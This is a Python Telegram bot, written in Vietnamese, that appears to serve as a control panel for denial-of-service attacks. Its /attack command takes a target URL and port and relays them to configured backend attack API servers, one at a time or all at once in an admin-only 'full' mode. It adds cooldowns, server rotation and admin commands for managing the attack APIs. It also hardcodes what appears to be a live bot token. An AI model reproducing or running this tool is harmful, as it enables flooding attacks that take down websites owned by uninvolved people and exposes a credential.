import json,re,requests,asyncio,random
from telegram import Update
from telegram.ext import ApplicationBuilder,CommandHandler,ContextTypes
from datetime import datetime,timedelta

URL_HINH={"loading":"https://ov20-engine.flamingtext.com/netfu/tmp28007/flamingtext_com-1656326255.png","success":"https://ov19-engine.flamingtext.com/netfu/tmp28007/flamingtext_com-3059895128.png","failure":"https://ov12-engine.flamingtext.com/netfu/tmp28016/coollogo_com-31571298.png"}
ADMIN_IDS = [7371969470, 6409065734]
NHOM_DUOC_PHEP = [-1002334544605, -4455667788, -4455667788, -4455667788, -4455667788, -4455667788, -5566778899, -6677889900, -7788990011, -8899001122]
bot_trang_thai,trang_thai_nguoi_dung,trang_thai_may_chu={"hoat_dong":True},{},{}

doc_cau_hinh=lambda f="server.json":json.load(open(f))or{"METHODS":"","requests":[]}
luu_cau_hinh=lambda d,f="server.json":json.dump(d,open(f,"w",encoding="utf-8"),ensure_ascii=0,indent=4)
la_url_hop_le=lambda u:re.match(r"^https?://",u)
la_admin=lambda u:u.message.from_user.id in ADMIN_IDS
la_nhom_duoc_phep=lambda u:u.message.chat.id in NHOM_DUOC_PHEP
la_nguoi_dung_duoc_phep=lambda u:la_admin(u)or la_nhom_duoc_phep(u)
la_bot_dang_hoat_dong=lambda u:bot_trang_thai["hoat_dong"]or la_admin(u)
la_nguoi_dung_dang_cho=lambda u:not la_admin(u)and(u.message.from_user.id in trang_thai_nguoi_dung and datetime.now()<trang_thai_nguoi_dung[u.message.from_user.id])

lay_may_chu_kha_dung=lambda ds:[mc for mc in ds if trang_thai_may_chu.get(mc["id"],{}).get("trang_thai","kha_dung")=="kha_dung"or trang_thai_may_chu[mc["id"]]["ban_den"]<=datetime.now()]
danh_dau_may_chu_ban=lambda id,tg:trang_thai_may_chu.update({id:{"trang_thai":"ban","ban_den":datetime.now()+timedelta(seconds=tg)}})

async def gui_phoi_hop(u,url,cap,data=None):await u.message.reply_photo(url,caption=f"<b>{cap}</b>{(chr(10)+f'<pre>{json.dumps(data,indent=4,ensure_ascii=0)}</pre>')if data else''}",parse_mode="HTML")

async def xu_ly_phoi_hop_api(u,res,sv):
    rs=[(r.json()|{'status':r.json().get('status','error'),'server_number':sv[i]['id']})if r.status_code==200 else{'status':'error','message':(json.loads(r.text)if r.text and r.text.strip().startswith('{')else r.text)or'Connection failed','error_code':r.status_code,'server_number':sv[i]['id']}for i,r in enumerate(res)]
    await gui_phoi_hop(u,URL_HINH['success'if(sc:=any(r['status']=='SUCCESS'for r in rs))else'failure'],'Kết nối API thành công 🚀'if sc else'Kết nối API thất bại',rs)
    return sc

async def tan_cong(u,ctx):
    if not la_nguoi_dung_duoc_phep(u):return await gui_phoi_hop(u,URL_HINH['failure'],'Bạn không có quyền sử dụng lệnh này.')
    if not la_bot_dang_hoat_dong(u)or la_nguoi_dung_dang_cho(u):return await gui_phoi_hop(u,URL_HINH['failure'],'Bot đang tắt.'if not la_bot_dang_hoat_dong(u)else f'Bạn đang có tiến trình khác. Chờ {int((trang_thai_nguoi_dung[(uid:=u.message.from_user.id)]-datetime.now()).total_seconds())} giây.')
    if len(ctx.args)<2 or not la_url_hop_le(ctx.args[0])or not ctx.args[1].isdigit():return await gui_phoi_hop(u,URL_HINH['failure'],'Vui lòng nhập {URL} và {PORT} hợp lệ. Ví dụ: /attack https://example.com 443.')
    h,p,f=ctx.args[0],ctx.args[1],len(ctx.args)>2 and ctx.args[2].lower()=='full'
    if f and not la_admin(u):return await gui_phoi_hop(u,URL_HINH['failure'],'Chỉ admin được dùng full')
    if not(cfg:=doc_cau_hinh())['requests']or not(mckd:=lay_may_chu_kha_dung(cfg['requests'])):return await gui_phoi_hop(u,URL_HINH['failure'],'Không tìm thấy máy chủ'if not cfg['requests']else'Tất cả máy chủ đều bận')
    res=[]
    for s in mckd if f and la_admin(u)else[random.choice(mckd)]:
        try:
            danh_dau_may_chu_ban(s['id'],200)
            if(msg:=await u.message.reply_photo(URL_HINH['loading'],caption='<b>Đang kết nối đến máy chủ API 🚀...</b>',parse_mode='HTML')):await asyncio.sleep(3),await msg.delete()
            url=f"{s['url'].rstrip('/')}{cfg['METHODS'].replace(';','')}".replace('{host}',h).replace('{port}',p)
            res.append(requests.get(url,timeout=10))
            print(f'Request to {url} - Status: {res[-1].status_code}')
        except Exception as e:res.append(type('',(),{'status_code':500,'_content':json.dumps({'status':'error','message':str(e)}).encode()})())
    if res and(await xu_ly_phoi_hop_api(u,res,mckd if f and la_admin(u)else[s]))and not la_admin(u):trang_thai_nguoi_dung[uid]=datetime.now()+timedelta(seconds=200)

async def bat_bot(u,_):la_admin(u)and(bot_trang_thai.update(hoat_dong=True)or await gui_phoi_hop(u,URL_HINH['success'],'Bot đã được bật.'))
async def tat_bot(u,_):la_admin(u)and(bot_trang_thai.update(hoat_dong=False)or await gui_phoi_hop(u,URL_HINH['success'],'Bot đã được tắt.'))
async def them_api(u,ctx):la_admin(u)and len(ctx.args)>=1 and la_url_hop_le(ctx.args[0])and(cfg:=doc_cau_hinh(),cfg['requests'].append({'id':len(cfg['requests'])+1,'url':ctx.args[0]}),luu_cau_hinh(cfg),await gui_phoi_hop(u,URL_HINH['success'],f'Đã thêm API: {ctx.args[0]}'))or await gui_phoi_hop(u,URL_HINH['failure'],'Vui lòng nhập URL hợp lệ. Ví dụ: /addapi https://okapi.zeabur.app/')
async def xoa_tat_ca_api(u,_):la_admin(u)and(cfg:=doc_cau_hinh(),cfg.update(requests=[]),luu_cau_hinh(cfg),await gui_phoi_hop(u,URL_HINH['success'],'Đã xóa toàn bộ API'))or await gui_phoi_hop(u,URL_HINH['failure'],'Bạn không có quyền sử dụng lệnh này.')

def main():
    app=ApplicationBuilder().token("7645949459:AAGHQKTFfhNG9fYH98lRuUFuq-Pvfj4U4JI").build()
    for c,f in zip(['attack','on','off','addapi','clearapi'],[tan_cong,bat_bot,tat_bot,them_api,xoa_tat_ca_api]):app.add_handler(CommandHandler(c,f))
    app.run_polling()

if __name__=='__main__':main()
